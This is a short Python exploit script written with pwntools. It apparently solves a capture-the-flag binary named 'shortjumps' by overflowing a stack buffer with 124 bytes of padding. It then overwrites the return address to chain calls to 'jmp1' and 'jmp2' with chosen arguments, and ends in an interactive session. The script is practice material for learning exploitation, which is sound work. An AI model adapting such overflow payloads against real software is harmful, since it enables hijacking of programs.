from pwn import *

exe = ELF('./shortjumps', checksec=False)

p = process(exe.path)
input()
p.sendlineafter(b'> ', b'a')
p.sendlineafter(b'> ', b'y')
pay = b'A'*124
pay += p32(exe.sym['jmp1']) +  \
    p32(exe.sym['main']) + p32(0xdeadbeef)
p.sendlineafter(b'> ', pay)


p.sendlineafter(b'> ', b'aaa')
p.sendlineafter(b'> ', b'y')

payload = b'A'*124
payload += p32(exe.sym['jmp2']) + p32(exe.sym['main']) + \
    p32(0xcafebabe) + p32(0x48385879)

p.sendlineafter(b'> ', payload)
p.interactive()
